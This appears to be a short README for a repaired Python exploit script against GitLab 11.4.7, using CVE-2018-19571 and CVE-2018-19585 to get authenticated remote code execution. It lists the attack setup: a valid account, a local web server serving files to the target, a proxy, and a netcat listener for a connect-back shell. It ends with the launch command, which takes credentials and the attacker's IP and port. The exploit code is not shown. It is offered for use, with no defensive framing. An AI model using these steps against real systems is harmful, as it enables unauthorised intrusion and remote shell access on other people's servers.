# edb-49263-fixed - GitLab 11.4.7 - Authenticated Remote Code Execution
Fixed version of the Python script to exploit CVE-2018-19571 and CVE-2018-19585 (GitLab 11.4.7 - Authenticated Remote Code Execution) that is available at https://www.exploit-db.com/exploits/49263 (Python 3.9).

## Usage
Edit the script and replace the target address there with the actual target address.

Also keep in mind that you have to

1. have a valid user account on the target Gitlab instance,
2. run a (python) web server on port 80 in the directory that the script is run from,
3. have an active proxy server on your machine on port 8080 (e. g. BURP with intercept turned off; script execution will fail without error if there is no proxy server running on the local host or if it is refusing connections), and
4. have a netcat listener set up on the desired port on your machine.

The script is then executed as follows:

`python3 49263.py -U username -P password -l local-ip -p local-port-for-netcat-listener`
